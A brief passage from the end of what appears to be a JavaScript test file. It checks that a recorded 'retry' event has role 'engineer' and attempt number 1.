    expect(events.find((e) => e.type === "retry")).toMatchObject({ role: "engineer", attempt: 1 });
  });
});
